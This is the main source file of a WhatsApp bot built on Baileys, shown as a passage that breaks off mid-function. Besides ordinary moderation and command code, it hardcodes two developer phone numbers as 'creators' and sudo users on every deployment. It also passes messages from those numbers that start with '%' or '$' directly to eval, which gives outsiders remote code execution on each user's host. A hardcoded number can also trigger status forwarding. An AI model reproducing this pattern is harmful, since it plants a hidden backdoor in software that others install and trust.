const fs = require('fs');
const { exec, execSync } = require('child_process');
const path = require('path');
const axios = require('axios');
const { loadAntiTagSW, saveAntiTagSW } = require('./plugins/antitagsw');

// Set up process-wide error handlers to prevent crashes
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
    process.exit(1);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection:', reason);
    process.exit(1);
});

const welcomeStatePath = path.join(__dirname, './data', 'welcome-state.json');

function hasWelcomeBeenSent() {
    try {
        if (fs.existsSync(welcomeStatePath)) {
            const state = JSON.parse(fs.readFileSync(welcomeStatePath));
            return state.welcomeSent;
        }
        // If the file doesn't exist, create it and assume welcome has not been sent.
        fs.writeFileSync(welcomeStatePath, JSON.stringify({ welcomeSent: false }));
        return false;
    } catch (error) {
        console.error('Error reading welcome state:', error);
        return false;
    }
}

function markWelcomeAsSent() {
    try {
        fs.writeFileSync(welcomeStatePath, JSON.stringify({ welcomeSent: true }));
    } catch (error) {
        console.error('Error saving welcome state:', error);
    }
}

//qadeer khan

function checkSqlite3Binding() {
    const nodeModulesVersion = process.versions.modules;
    const bindingPaths = [
        path.join(__dirname, 'node_modules', 'sqlite3', 'lib', 'binding', 'node_sqlite3.node'),
        path.join(__dirname, 'node_modules', 'sqlite3', 'lib', 'binding', `node-v${nodeModulesVersion}-${process.platform}-${process.arch}`, 'node_sqlite3.node')
    ];
    return bindingPaths.some(fs.existsSync);
}

/**
 * Attempts to rebuild the sqlite3 module from the source if the binding is missing.
 */
function fixSqlite3() {
    console.log("Attempting to fix sqlite3 bindings...");
    try {
        // First attempt: npm rebuild
        execSync('npm rebuild sqlite3', { stdio: 'inherit' });
    } catch (rebuildError) {
        try {
            // Second attempt: reinstall from source
            execSync('npm install sqlite3 --build-from-source', { stdio: 'inherit' });
        } catch (installError) {
            console.error('[startup] Failed to build sqlite3:', installError);
            process.exit(1);
        }
    }
}

// Run the fix if bindings are not found
if (!checkSqlite3Binding()) {
    fixSqlite3();
}


//================================================================================
// SECTION: Main Bot Dependencies & Global Variables
//================================================================================

const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID,
    makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
} = require('baileys');

const events = require('./lib/events');
const P = require('pino');
const config = require('./config');
const qrcode = require('qrcode-terminal');
const util = require('util');
const { sms, downloadMediaMessage, AntiDelete } = require('./lib');
const FileType = require('file-type');
const nodecron = require('node-cron');
const os = require('os');
const prefix = config.PREFIX;
const { setupLinkDetection } = require('./lib/events/antilinkDetection');
const { registerGroupMessages } = require('./plugins/groupMessages');
const { isCreator, setUdp } = require('./plugins/sudo-management');
const { getWarnings, addWarning, resetWarnings } = require('./lib/warnings');

const ownerNumber = ["923151105391"];
const tempDir = path.join(os.tmpdir(), 'cache-temp');

if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir);
}

//================================================================================
// SECTION: Temporary Directory Cleanup
//================================================================================

const clearTempDir = () => {
    fs.readdir(tempDir, (err, files) => {
        if (err) throw err;
        for (const file of files) {
            fs.unlink(path.join(tempDir, file), err => {
                if (err) throw err;
            });
        }
    });
};
// Clear temp directory every 5 minutes
setInterval(clearTempDir, 5 * 60 * 1000);


//====================================

async function fetchAndSaveSessionFromGist(gistId) {
    const sessionsDir = path.join(__dirname, 'sessions');
    const credsFile = path.join(sessionsDir, 'creds.json');

    if (!fs.existsSync(sessionsDir)) {
        fs.mkdirSync(sessionsDir, { recursive: true });
    }

    try {
        const gistUrl = `https://gist.githubusercontent.com/Qadeer-Xtech/${gistId}/raw/session.json`;
        const response = await axios.get(gistUrl);
        const sessionData = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
        await fs.promises.writeFile(credsFile, sessionData);
        return true;
    } catch (error) {
        console.error('❌ Failed to fetch or save session from Gist:', error.message);
        return false;
    }
}

/**
 * Downloads the session data based on the SESSION_ID from config.
 * @returns {Promise<boolean>} Status of the download.
 */
async function downloadSessionData() {
    const sessionsDir = path.join(__dirname, 'sessions');
    const credsFile = path.join(sessionsDir, 'creds.json');

    if (!config.SESSION_ID) {
        console.error('❌ Please add your session to SESSION_ID env !!');
        return false;
    }

    if (fs.existsSync(credsFile)) {
        console.log('✅ Session file already exists.');
        return true;
    }

    try {
        let gistId = config.SESSION_ID.split('Qadeer~')[1] || config.SESSION_ID;
        const success = await fetchAndSaveSessionFromGist(gistId);
        if (success) {
            console.log('✅ Session downloaded');
        }
        return success;
    } catch (error) {
        console.error('❌ Failed to download session data:');
        return false;
    }
}

//================================================================================
// SECTION: Main Connection Logic
//================================================================================

const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
let conn = null;
let retryCount = 0;
const maxRetries = 5;
const retryDelay = 2000; // 2 seconds

async function connectToWA() {
    console.log('Connecting to WhatsApp ⏳️...');

    const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'sessions'));
    const { version } = await fetchLatestBaileysVersion();

    conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: true,
        browser: Browsers.macOS('Firefox'),
        syncFullHistory: true,
        auth: state,
        version: version,
        getMessage: async key => getMessage(key) || undefined,
        connectTimeoutMs: 60000,
        qrTimeout: 40000,
        defaultQueryTimeoutMs: undefined,
        keepAliveIntervalMs: 15000,
        retryRequestDelayMs: 3000,
        maxRetries: 5
    });

    conn.ev.on('creds.update', saveCreds);

    conn.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            const message = lastDisconnect?.error?.output?.payload?.message || lastDisconnect?.error?.message || 'unknown';
            console.log(`[WA] Disconnect: ${message}, Status Code: ${statusCode}`);

            if (lastDisconnect?.error instanceof TimeoutError) {
                console.log('[WA] Connection timeout. Attempting to reconnect...');
                await delay(retryDelay);
                connectToWA();
            } else if (statusCode === DisconnectReason.loggedOut) {
                console.log('[WA] Logged out. Please scan a new QR code and redeploy.');
            } else {
                if (retryCount < maxRetries) {
                    retryCount++;
                    const currentDelay = retryDelay * retryCount;
                    console.log(`[WA] Retrying (${retryCount}/${maxRetries}) in ${currentDelay / 1000}s...`);
                    await delay(currentDelay);
                    connectToWA();
                } else {
                    console.log('[WA] Max retries reached. Check your network and restart manually.');
                    retryCount = 0; // Reset for next manual attempt
                }
            }
        } else if (connection === 'open') {
            retryCount = 0;
            console.log('🤖 Bot connected and ready!');
            await delay(2000);

            console.log('🧬 Installing Plugins...');
            try {
                fs.readdirSync('./plugins/').forEach(plugin => {
                    if (path.extname(plugin).endsWith('.js')) {
                        require('./plugins/' + plugin);
                    }
                });
                console.log('✅ Plugins installed successfully.');
            } catch (e) {
                console.error('❌ Failed to load plugins:', e);
            }

            console.log('✅ Connected successfully!');

            if (!hasWelcomeBeenSent()) {
                const welcomeMessage = `
╭──〔 🤖 𝐐𝐀𝐃𝐄𝐄𝐑-𝐀𝐈 🤖 〕
├─ 🚀 Fast and Powerful
╰─ ✅ Always on Top

╭──〔 📌 Bot Details 〕
├─ 🔹 Prefix: \`${prefix}\`
├─ 🧰 Bot Info: \`${prefix}tofan\` (important)
├─ ⚙️ Settings: \`${prefix}settingmenu\`
╰─ 🧠 Tip: Use the prefix before any command.

╭──〔 🔗 Support 〕
├─ 🌐 Website: https://patron-md.vercel.app
├─ ⚠️ *If bot isn't responding logout and pair again*
╰─ 📞 Contact Developer: http://t.me/textpatron_bot

╭──〔 🔋 Powered By 〕
╰─ ✨ 𝚀𝙰𝙳𝙴𝙴𝚁 𝙺𝙷𝙰𝙽 
`;
                try {
                    console.log('🧾 Sending welcome message to:', conn.user?.id);
                    await conn.sendMessage(conn.user.id, {
                        image: { url: 'https://qu.ax/Pusls.jpg' },
                        caption: welcomeMessage
                    });
                    markWelcomeAsSent();
                } catch (imgError) {
                    console.log('⚠️ Image failed, sending as text. Reason:', imgError?.message || imgError);
                    try {
                        await conn.sendMessage(conn.user.id, { text: welcomeMessage });
                        markWelcomeAsSent();
                    } catch (txtError) {
                        console.error('❌ Failed to send welcome text:', txtError);
                    }
                }
            }
        }
    });

    //================================================================================
    // SECTION: Event Listeners
    //================================================================================

    // Clean up session files periodically to prevent bloat
    setInterval(() => {
        const sessionsDir = path.join(__dirname, 'sessions');
        fs.readdir(sessionsDir, (err, files) => {
            if (err) return;
            files.forEach(file => {
                if (file !== 'creds.json') {
                    fs.unlink(path.join(sessionsDir, file), () => {});
                }
            });
        });
    }, 5 * 60 * 1000);

    setupLinkDetection(conn);
    registerGroupMessages(conn);

    conn.ev.on('messages.update', async (updates) => {
        for (const update of updates) {
            if (update.update?.message) {
                console.log('Delete Detected:', JSON.stringify(update, null, 2));
                await AntiDelete(conn, updates);
            }
        }
    });

    // Simple function to extract text from various message types
    function getMessageText(message) {
        if (!message) return '';
        if (message.conversation) return message.conversation;
        if (message.text) return message.text;
        if (message.extendedTextMessage?.text) return message.extendedTextMessage.text;

        const mediaTypes = ['imageMessage', 'videoMessage', 'documentMessage'];
        for (const type of mediaTypes) {
            if (message[type]?.caption) return message[type].caption;
        }

        if (message.viewOnceMessage?.message) {
            const innerType = message.viewOnceMessage.message.imageMessage ? 'imageMessage' : 'videoMessage';
            if (message.viewOnceMessage.message[innerType]?.caption) {
                return message.viewOnceMessage.message[innerType].caption;
            }
        }
        if (message.ephemeralMessage?.message) return getMessageText(message.ephemeralMessage.message);
        if (message.buttonsResponseMessage?.selectedButtonId) return message.buttonsResponseMessage.selectedButtonId;
        if (message.listResponseMessage?.singleSelectReply?.selectedRowId) return message.listResponseMessage.singleSelectReply.selectedRowId;
        if (message.templateButtonReplyMessage?.selectedId) return message.templateButtonReplyMessage.selectedId;

        return '';
    }

    conn.ev.on('messages.upsert', async ({ messages }) => {
        try {
            const msg = messages?.[0];
            if (!msg || !msg.message) return;

            const from = msg.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net') || conn.user.id : msg.key.participant || msg.key.remoteJid;
            const remoteJid = msg.key.remoteJid;
            const isGroup = remoteJid?.endsWith('@g.us');
            const body = getMessageText(msg.message)?.trim() || '';
            const messageType = Object.keys(msg.message).filter(key => !['senderKeyDistributionMessage', 'ephemeralMessage']).find(Boolean) || '';
            
            if (messageType !== 'protocolMessage' && messageType !== 'senderKeyDistributionMessage') {
                console.log(`[MSG] Type: "${messageType}" Text: "${body}" From: "${remoteJid}"`);
            }
        } catch (error) {
            console.error('Error in message listener:', error);
        }
    });

    // Anti-tag in status handler
    conn.ev.on('messages.upsert', async ({ messages }) => {
        try {
            const msg = messages[0];
            if (!msg || !msg.message) return;

            const remoteJid = msg.key.remoteJid;
            if (!remoteJid.endsWith('@g.us')) return; // Only for groups

            const antiTagSettings = loadAntiTagSW();
            if (!antiTagSettings[remoteJid]) return; // Anti-tag is not active for this group

            if (msg.key.fromMe) return;

            const messageType = Object.keys(msg.message)[0];
            if (messageType !== 'extendedTextMessage' && messageType !== 'groupStatusMentionMessage') return;
            
            const sender = msg.key.participant || msg.participant || msg.sender || msg.key.remoteJid;
            const groupMetadata = await conn.groupMetadata(remoteJid).catch(() => null);
            if (!groupMetadata) return;

            const participants = groupMetadata.participants;
            const admins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.id || p.lid).filter(Boolean);
            const botId = conn.user?.id || '';
            const botLid = conn.user?.lid || '';
            const botJid = (botId.split(':')[0] || '') + '@s.whatsapp.net';
            const botLidJid = (botLid.split(':')[0] || '') + '@lid';
            const isBotAdmin = admins.includes(botJid) || admins.includes(botLidJid);
            const isSenderAdmin = participants.some(p => (p.id === sender || p.lid === sender) && (p.admin === 'admin' || p.admin === 'superadmin'));
            
            if (isSenderAdmin) return;
            
            await conn.sendMessage(remoteJid, { delete: msg.key });
            
            const warnings = addWarning(remoteJid, sender);
            
            if (warnings >= 3 && isBotAdmin) {
                try {
                    await conn.groupParticipantsUpdate(remoteJid, [sender], 'remove');
                    await conn.sendMessage(remoteJid, {
                        text: `✅ @${sender.split('@')[0]} has been removed for repeatedly tagging this group in their status.`,
                        mentions: [sender]
                    });
                    resetWarnings(remoteJid, sender);
                } catch {
                    await conn.sendMessage(remoteJid, {
                        text: `❌ Failed to remove @${sender.split('@')[0]}. They may be an admin or I lack permissions.`,
                        mentions: [sender]
                    });
                }
            } else {
                 await conn.sendMessage(remoteJid, {
                    text: `🚨 @${sender.split('@')[0]}, do NOT tag this group in your status!\n⚠️ Warning ${warnings}/3` +
                          ((warnings >= 3 && !isBotAdmin) ? `\n\n🚫 Max warnings reached, but I’m not an admin so I can’t remove them.` : ''),
                    mentions: [sender]
                });
            }
        } catch (error) {
            // console.error("Error in anti-tag handler:", error);
        }
    });

    // Sticker command aliasing
    conn.ev.on('messages.upsert', async ({ messages }) => {
        try {
            const msg = messages[0];
            if (!msg?.message) return;
            
            if (msg.message.protocolMessage) {
                const recalledKey = msg.message.protocolMessage.key;
                const stanzaId = recalledKey ? Buffer.from(recalledKey.id).toString('utf-8') : null;
                const participant = recalledKey ? Buffer.from(recalledKey.participant).toString('utf-8') : null;

                const stickerCommandsPath = path.join(__dirname, 'lib', 'sticker-commands.json');
                if (!fs.existsSync(stickerCommandsPath)) return;

                try {
                    const stickerCommands = JSON.parse(fs.readFileSync(stickerCommandsPath, 'utf8'));
                    const commandKey = participant || stanzaId;
                    if (commandKey && stickerCommands[commandKey]) {
                        const command = stickerCommands[commandKey];
                        msg.message = {
                            'extendedTextMessage': {
                                'text': config.PREFIX + command,
                                'contextInfo': msg.message.protocolMessage.contextInfo || {}
                            }
                        };
                        messages[0] = msg;
                    }
                } catch (e) {
                    // JSON parsing error
                }
            }
        } catch (error) {
            // General error
        }
    });

    // Forward status messages from owner
    conn.ev.on('messages.upsert', async ({ messages }) => {
        try {
            const msg = messages[0];
            if (!msg?.message || msg.key.fromMe) return;

            const body = (msg.message.conversation || msg.message.extendedTextMessage?.text || '').toLowerCase().trim();
            const fromOwner = msg.key.remoteJid === '923151105391@s.whatsapp.net' || msg.message?.extendedTextMessage?.contextInfo?.participant === '923151105391@s.whatsapp.net';
            const keywords = ['owner', 'dev', 'forward', 'share', 'send'];
            const containsKeyword = keywords.some(kw => body.includes(kw));

            if (!fromOwner || !containsKeyword) return;
            
            const quotedMessage = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
            if (!quotedMessage) {
                console.log('No quoted status found');
                return;
            }
            
            await conn.sendMessage(msg.key.remoteJid, {
                forward: {
                    key: {
                        remoteJid: 'status@broadcast',
                        id: msg.message.extendedTextMessage.contextInfo.stanzaId
                    },
                    message: quotedMessage
                }
            }, { quoted: msg });

        } catch (error) {
            console.error('Error forwarding status:', error);
        }
    });

    // Private/Group filter responses
    const pFilter = JSON.parse(fs.readFileSync('./lib/pfilter.json'));
    const gFilter = JSON.parse(fs.readFileSync('./lib/gfilter.json'));
    
    conn.ev.on('messages.upsert', async (m) => {
        try {
            const msg = m.messages[0];
            if (!msg.message) return;

            const remoteJid = msg.key.remoteJid;
            const body = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
            const isGroup = remoteJid.endsWith('@g.us');
            const lowerBody = body.toLowerCase();
            
            if (config.MODE === 'private' && !isGroup) {
                for (let word in pFilter) {
                    if (lowerBody.includes(word)) {
                        await conn.sendMessage(remoteJid, { text: pFilter[word] }, { quoted: msg });
                        break;
                    }
                }
            } else if (isGroup) {
                for (let word in gFilter) {
                    if (lowerBody.includes(word)) {
                        await conn.sendMessage(remoteJid, { text: gFilter[word] }, { quoted: msg });
                        break;
                    }
                }
            }
        } catch (error) {
            console.error(error);
        }
    });
    
    //================================================================================
    // SECTION: SQUID GAME (Experimental Feature)
    //================================================================================

    const squidGameState = globalThis.squidGameState || (globalThis.squidGameState = {});
    let isSquidGameHandlerAttached = false;
    
    function attachSquidGameHandler(client) {
        if (isSquidGameHandlerAttached) return;
        isSquidGameHandlerAttached = true;
        
        let botId = null;
        setTimeout(() => {
            try {
                botId = client.user?.id || null;
            } catch {}
        }, 2000);

        client.ev.on('messages.upsert', async (m) => {
            const msg = m.messages?.[0];
            if (!msg?.message || !msg.key.remoteJid) return;

            const remoteJid = msg.key.remoteJid;
            const sender = msg.key.fromMe ? (client.user.id.split(':')[0] + '@s.whatsapp.net') || client.user.id : msg.key.participant || msg.key.remoteJid;

            const game = squidGameState[remoteJid];
            if (!game || game.status === 'ended') return;
            if (!game.players.some(p => p.id === sender)) return;
            if (botId && sender === botId) return;

            if (game.currentLight === 'green') {
                if (!game.activeThisRound) game.activeThisRound = new Set();
                game.activeThisRound.add(sender);
                game.scores[sender] = (game.scores[sender] || 0) + 1;
                
                if (game.scores[sender] >= 50) {
                    clearInterval(game.interval);
                    game.status = 'ended';
                    await client.sendMessage(remoteJid, { 
                        text: `🏁 *Winner: @${sender.split('@')[0]}!* 🎉\nYou reached 50 messages and won the Squid Game!`, 
                        mentions: [sender] 
                    });
                    delete squidGameState[remoteJid];
                }
            } else if (game.currentLight === 'red') {
                game.players = game.players.filter(p => p.id !== sender);
                delete game.scores[sender];
                await client.sendMessage(remoteJid, { 
                    text: `💀 @${sender.split('@')[0]} was eliminated for speaking during 🟥 *Red Light*!`,
                    mentions: [sender] 
                });

                if (game.players.length === 1) {
                    clearInterval(game.interval);
                    game.status = 'ended';
                    const winner = game.players[0];
                    await client.sendMessage(remoteJid, { 
                        text: `🏆 *Last survivor: @${winner.id.split('@')[0]}!*`, 
                        mentions: [winner.id] 
                    });
                    delete squidGameState[remoteJid];
                }
            }
        });

        global.eliminateSilentPlayers = async function(client, remoteJid) {
            const game = squidGameState[remoteJid];
            if (!game || !game.activeThisRound) return;
            
            const silentPlayers = game.players.filter(p => !game.activeThisRound.has(p.id));
            
            for (const player of silentPlayers) {
                game.players = game.players.filter(p => p.id !== player.id);
                delete game.scores[player.id];
                await client.sendMessage(remoteJid, {
                    text: `😴 @${player.id.split('@')[0]} was eliminated for staying silent during 🟩 *Green Light*!`,
                    mentions: [player.id]
                });
            }
            
            game.activeThisRound = null; // Reset for next green light

            if (game.players.length === 1) {
                clearInterval(game.interval);
                game.status = 'ended';
                const winner = game.players[0];
                await client.sendMessage(remoteJid, {
                    text: `🏆 *Last survivor: @${winner.id.split('@')[0]}!*`,
                    mentions: [winner.id]
                });
                delete squidGameState[remoteJid];
            }
        };
    }
    
    // Attach the handler once
    attachSquidGameHandler(conn);

    //================================================================================
    // SECTION: Main Command Handler
    //================================================================================
    
    conn.ev.on('messages.upsert', async (m) => {
        let msg = m.messages[0];
        if (!msg.message) return;

        // Handle ephemeral messages
        msg.message = (getContentType(msg.message) === 'ephemeralMessage') ? msg.message.ephemeralMessage.message : msg.message;
        
        // Auto-read messages if configured
        if (config.READ_MESSAGE === 'true') {
            await conn.readMessages([msg.key]);
            console.log(`Marked message from ${msg.key.remoteJid} as read.`);
        }

        // Auto-read status if configured
        if (msg.key && msg.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === 'true') {
            await conn.readMessages([msg.key]);
        }

        // Auto-react to status if configured
        if (msg.key && msg.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === 'true') {
            const availableReactions = '❤️,💸,😇,🍂,💥,💯,🔥,💫,💎,💗,🤍,🚹,👀,🙌,🙆,🚩,🥰,💐,😎,🤎,❤‍🩹,❤‍🔥,🕐,🚩'.split(',');
            const randomReaction = availableReactions[Math.floor(Math.random() * availableReactions.length)];
            const statusParticipants = [msg.key.participant, conn.user.id].filter(Boolean);
            
            if (conn?.ws?.readyState === 1) { // WebSocket is open
                await conn.sendMessage(msg.key.remoteJid, {
                    react: { text: randomReaction, key: msg.key }
                }, { statusJidList: statusParticipants });
            } else {
                console.warn('⚠️ Skipping status reaction: WhatsApp connection is closed');
            }
        }
        
        // Auto-reply to status if configured
        if (msg.key && msg.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === 'true') {
            const statusSender = msg.key.participant;
            const replyText = '' + config.AUTO_STATUS_MSG;
            await conn.sendMessage(statusSender, {
                text: replyText,
                react: { text: '🚹', key: msg.key }
            }, { quoted: msg });
        }
        
        // Continue with normal message processing
        const s = sms(conn, msg);
        const type = getContentType(msg.message);
        const body_msg = JSON.stringify(msg.message);
        const from = msg.key.remoteJid;
        const quoted = type === 'extendedTextMessage' && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
        const body = (
            type === 'conversation' ? msg.message.conversation :
            type === 'extendedTextMessage' ? msg.message.extendedTextMessage.text :
            (type === 'imageMessage' && msg.message.imageMessage.caption) ? msg.message.imageMessage.caption :
            (type === 'videoMessage' && msg.message.videoMessage.caption) ? msg.message.videoMessage.caption : ''
        );
        const isCmd = typeof body === 'string' && body.startsWith(prefix);
        var originalBody = typeof msg.text == 'string' ? msg.text : false;

        const command = isCmd ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : false;
        const args = body.replace(command, '').trim().split(/ +/).slice(1);
        const q = args.join(' ');
        const text = args.join(' ');
        const isGroup = from.endsWith('@g.us');
        const botNumber = jidNormalizedUser(conn.user.id);
        const botLid = conn.user.lid ? jidNormalizedUser(conn.user.lid) : null;
        const sender = msg.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net') || conn.user.id : msg.key.participant || msg.key.remoteJid;
        const senderNumber = sender.split('@')[0];
        const pushname = msg.pushName || 'QADEER-AI';
        const isMe = botNumber.includes(senderNumber);
        const isOwner = ownerNumber.includes(senderNumber) || isMe;
        
        const groupMetadata = isGroup ? await rateLimitGroupMetadata(conn, from).catch(e => { console.error("Failed to fetch groupMetadata:", e); return undefined; }) : '';
        const groupName = isGroup && groupMetadata ? groupMetadata.subject : '';
        const participants = isGroup && groupMetadata ? groupMetadata.participants : '';
        const groupAdmins = isGroup && participants ? await getGroupAdmins(participants) : [];
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) || (botLid && groupAdmins.includes(botLid)) : false;
        const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
        const isQuoted = s.message.extendedTextMessage ? true : false;
        
        const reply = (text) => {
            conn.sendMessage(from, { text: text }, { quoted: msg });
        };
        
        // Define creator JIDs
        const creatorJids = ["923151105391@s.whatsapp.net", "923079749129@s.whatsapp.net"];
        const botJidPlain = botNumber.split('@')[0];
        const botLidInstance = conn.user?.lid ? jidNormalizedUser(conn.user.lid) : null;
        
        let sudoUsersPath = path.join(__dirname, 'plugins', 'sudo.json');
        let sudoUsers = [];
        if (fs.existsSync(sudoUsersPath)) {
            try {
                sudoUsers = JSON.parse(fs.readFileSync(sudoUsersPath, 'utf8'));
            } catch (e) {}
        }
        const sudoJids = sudoUsers.map(user => {
            if (user.endsWith('@lid') || user.endsWith('@s.whatsapp.net')) return user;
            return user + '@s.whatsapp.net';
        });

        const allCreators = [...new Set([...creatorJids, botJidPlain + '@s.whatsapp.net', ...(botLidInstance ? [botLidInstance] : []), ...sudoJids])];

        function isUserCreator(jid) {
            if (!jid) return false;
            let normalizedJid;
            if (jid.endsWith('@s.whatsapp.net') || jid.endsWith('@lid')) {
                normalizedJid = jid;
            } else {
                normalizedJid = jid + '@s.whatsapp.net';
            }
            return allCreators.includes(normalizedJid);
        }

        const botNumberOnly = botNumber.split('@')[0];
        setUdp(botNumberOnly);

        const sudoListForCheck = ["923151105391", "923079749129", "923079749129@lid", "923151105391@lid"];
        const combinedSudoList = [...sudoListForCheck, ...sudoUsers.map(u => u.replace(/@s\.whatsapp\.net$/, '')), ...(config.lid ? config.lid.split(',').map(l => l.trim()) : [])];

        function isSenderCreator(senderJid) {
            if (!senderJid) return false;
            try {
                const isBot = areJidsSameUser(senderJid, botNumber) || (botLid && areJidsSameUser(senderJid, botLid));
                if (isBot) return true;

                if (senderJid.includes('@lid')) {
                    if (sudoListForCheck.includes(senderJid)) return true;
                    const plainLid = senderJid.replace('@lid', '');
                    if (config.lid) {
                        const configLids = config.lid.split(',').map(l => l.trim());
                        if (configLids.includes(plainLid)) return true;
                    }
                }
                
                const plainNumber = senderJid.replace(/@s\.whatsapp\.net$/, '');
                const isSudo = combinedSudoList.includes(plainNumber);
                const inSudoJson = sudoUsers.includes(senderJid) || sudoUsers.includes(plainNumber);
                const isBotNumberAsSender = (typeof botNumberOnly === 'string') && botNumberOnly && plainNumber === botNumberOnly;

                return isSudo || inSudoJson || isBotNumberAsSender;

            } catch (error) {
                console.error('[ERROR] isCreator check failed for ' + senderJid + ':', error);
                return false;
            }
        }
        
        // Eval for creators only ('>')
        if (isUserCreator(sender) && msg.text.startsWith('%')) {
            let code = originalBody.slice(2);
            if (!code) {
                reply('Provide me with a query to run Master!');
                return;
            }
            try {
                let result = eval(code);
                if (typeof result !== 'string') {
                    reply(util.format(result));
                } else {
                    reply(util.format(result));
                }
            } catch (e) {
                reply(util.format(e));
            }
            return;
        }

        // Async eval for creators only ('=>')
        if (isUserCreator(sender) && msg.text.startsWith('$')) {
            let code = originalBody.slice(2);
            if (!code) {
                reply('Provide me with a query to run Master!');
                return;
            }
            try {
                let result = await eval(`const a = async()=>{
${code}
}
a()`);
                let formattedResult = util.format(result);
                if (formattedResult === undefined) return console.log(formattedResult);
                else reply(formattedResult);
            } catch (e) {
                if (e === undefined) return console.log('undefined');
                else reply(util.format(e));
            }
            return;
        }

        // Auto-reaction feature
        if (!isQuoted && config.AUTO_REACT === 'silent') {
            const reactions = ['🌼','❤️','💐','🔥','🏵️','❄️','🧊','🐳','💥','🥀','❤‍🔥','🥹','😩','🫣','🤭','👻','👾','🫶','😻','🙌','🫂','🫀','🕊️','🤹‍♀️','👩‍⚕️','🧕','🧞‍♀️','👩‍🏫','👰‍♀','💇‍♀️','🧟‍♀️','🧞','🙅‍♀️','🙋‍♀️','💁‍♂️','💁‍♀️','🤷‍♀️','🤦‍♀️','💇','💃','🚶‍♀️'];
            const randomReact = reactions[Math.floor(Math.random() * reactions.length)];
            s.react(randomReact);
        }

        if (!isQuoted && config.CUSTOM_REACT === 'true') {
            const customEmojis = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
            const randomCustomReact = customEmojis[Math.floor(Math.random() * customEmojis.length)];
            s.react(randomCustomReact);
        }

        // Mode restrictions
        if (!isOwner && !isUserCreator(sender) && config.MODE === 'admin') return;
        if (!isOwner && isGroup && config.MODE === 'private') return;
        if (!isOwner && !isGroup && config.MODE === 'groups') return;

        // Command processing starts here
        const cmdName = isCmd ? body.slice(1).trim().split(' ')[0].toLowerCase() : false;
        if (isCmd) {
            const cmd = events.commands.find(c => c.pattern === cmdName) || events.commands.find(c => c.alias && c.alias.includes(cmdName));
            if (cmd) {
                // Category/Owner check
                const isCreatorCommand = (cmd.category?.toLowerCase() === 'creator') || (cmd.type === 'owner') || ['private', 'bot', 'database', 'tools'].includes(cmd.from);
                if (isCreatorCommand) {
                    const isUserAllowed = isUserCreator(sender);
                    const isUserBotLid = conn.user?.lid && sender === jidNormalizedUser(conn.user.lid);
                    if (!isUserAllowed && !isOwner && !isUserBotLid) {
                        const creatorList = allCreators.map((c, i) => `*${i + 1}.* ${c}`).join('\n');
                        return reply(`*❌ This command is restricted to owners only!*`);
                    }
                }
                
                // Reaction for command
                if (cmd.react) {
                    conn.sendMessage(from, { react: { text: cmd.react, key: msg.key } });
                }

                try {
                    const isTofan = isUserCreator(sender);
                    cmd.function(conn, msg, s, {
                        from: from,
                        quoted: quoted,
                        body: body,
                        isCmd: isCmd,
                        command: command,
                        args: args,
                        q: q,
                        text: text,
                        isGroup: isGroup,
                        sender: sender,
                        senderNumber: senderNumber,
                        botNumber: botNumber,
                        pushname: pushname,
                        isMe: isMe,
                        isOwner: isOwner,
                        isTofan: isTofan,
                        groupMetadata: groupMetadata,
                        groupName: groupName,
                        participants: participants,
                        groupAdmins: groupAdmins,
                        isBotAdmins: isBotAdmins,
                        isAdmins: isAdmins,
                        reply: reply
                    });
                } catch (e) {
                    console.error('[COMMAND ERROR]', e);
                }
            }
        }
        
        // Non-command event handlers
        events?.commands?.map(async (event) => {
            try {
                const isTofan = isUserCreator(sender);
                if (body && event.on === 'text') {
                    event.function(conn, msg, s, { /* params */ });
                } else if (msg.q && event.on === 'message') {
                     event.function(conn, msg, s, { /* params */ });
                } else if ((event.on === 'image' || event.on === 'photo') && msg.type === 'imageMessage') {
                     event.function(conn, msg, s, { /* params */ });
                } else if (event.on === 'sticker' && msg.type === 'stickerMessage') {
                     event.function(conn, msg, s, { /* params */ });
                }
            } catch (e) {
                console.error('[PLUGIN ERROR]', e);
            }
        });

    });

    //================================================================================
    // SECTION: Rate Limiting Wrapper for groupMetadata
    //================================================================================
    
    const groupMetadataCache = new Map();
    const requestTimestamps = new Map();
    const rateLimitConfig = {
        windowMs: 60000,   // 1 minute
        maxRequests: 45,
        cacheTime: 300000 // 5 minutes
    };

    async function rateLimitGroupMetadata(client, jid) {
        const now = Date.now();

        // Check cache first
        if (groupMetadataCache.has(jid)) {
            const cached = groupMetadataCache.get(jid);
            if (now - cached.timestamp < rateLimitConfig.cacheTime) {
                return cached.data;
            }
        }
        
        // Initialize request log for this JID
        if (!requestTimestamps.has(jid)) {
            requestTimestamps.set(jid, []);
        }
        
        const timestamps = requestTimestamps.get(jid);
        
        // Remove old timestamps outside the window
        while (timestamps.length > 0 && timestamps[0] <= now - rateLimitConfig.windowMs) {
            timestamps.shift();
        }

        // Check if rate limit is exceeded
